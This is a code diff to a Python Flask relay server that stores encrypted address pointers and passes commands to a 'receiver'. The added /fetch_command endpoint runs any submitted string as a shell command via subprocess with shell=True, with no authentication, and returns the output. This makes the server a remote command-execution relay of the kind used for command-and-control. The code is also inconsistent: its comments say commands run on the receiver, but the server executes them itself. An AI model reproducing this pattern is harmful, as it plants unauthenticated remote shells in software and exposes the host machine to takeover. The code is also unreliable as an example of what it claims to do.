@@ -6,6 +6,7 @@ import string
 import base64
 import time
 import os
+import subprocess
 
 app = Flask(__name__)
 
@@ -14,6 +15,9 @@ FERNET_KEY = Fernet.generate_key()
 cipher = Fernet(FERNET_KEY)
 POINT_FILE = 'point.txt'
 EXPIRATION_TIME = 3600  # Expiration time in seconds (1 hour)
+
+commands_dict = {}  # In-memory store for pending commands
+results_dict = {}   # In-memory store for command results
 
 # Generate a random 4-character alphanumeric pointer
 def generate_pointer():
@@ -122,25 +126,49 @@ def connect():
     print(f"Decrypted IP and port: {ip}:{port}")
     return jsonify({"message": f"Connected to {ip}:{port}"})
 
-# Send command endpoint to relay to the receiver
 @app.route('/send_command', methods=['POST'])
 def send_command():
     data = request.get_json()
     code = data.get("code")
     command = data.get("command")
     pointer = code[:4]
+    
+    commands_dict[pointer] = command  # Store command for receiver to execute
     update_timestamp(pointer)
     print(f"Received command: {command}")
     return jsonify({"message": "Command relayed to receiver"})
 
-# Fetch result placeholder endpoint
+@app.route('/fetch_command', methods=['POST'])
+def fetch_command():
+    data = request.get_json()
+    code = data.get("code")
+    pointer = code[:4]
+    
+    command = commands_dict.pop(pointer, None)  # Retrieve and remove command after execution
+    if command is None:
+        return jsonify({"command": None})
+    print(f"Fetched command for pointer {pointer}: {command}")
+    try:
+        # Execute the command on the receiver machine
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = process.communicate()
+        
+        # Store result in memory
+        results_dict[pointer] = output.decode("utf-8") if output else error.decode("utf-8")
+    except Exception as e:
+        results_dict[pointer] = f"Command execution failed: {str(e)}"
+    return jsonify({"command": command})
+
 @app.route('/fetch_result', methods=['POST'])
 def fetch_result():
     data = request.get_json()
     code = data.get("code")
     pointer = code[:4]
-    print(f"Fetching result for command with pointer {pointer}")
-    return jsonify({"output": "Command output from receiver"})
+    
+    # Retrieve the result for the executed command
+    result = results_dict.pop(pointer, "No response from server.")
+    print(f"Fetched result for pointer {pointer}: {result}")
+    return jsonify({"output": result})
 
 def cleanup_old_keys():
     current_time = time.time()
@@ -154,6 +182,10 @@ def cleanup_old_keys():
                     timestamp, pointer, decryption_key, encrypted_ip_port_remainder = parts
                     if current_time - float(timestamp) < EXPIRATION_TIME:
                         f.write(line)
+                    else:
+                        # Remove expired pointers from command and result dictionaries
+                        commands_dict.pop(pointer, None)
+                        results_dict.pop(pointer, None)
 
 cleanup_thread = threading.Thread(target=lambda: (time.sleep(600), cleanup_old_keys()))
 cleanup_thread.daemon = True
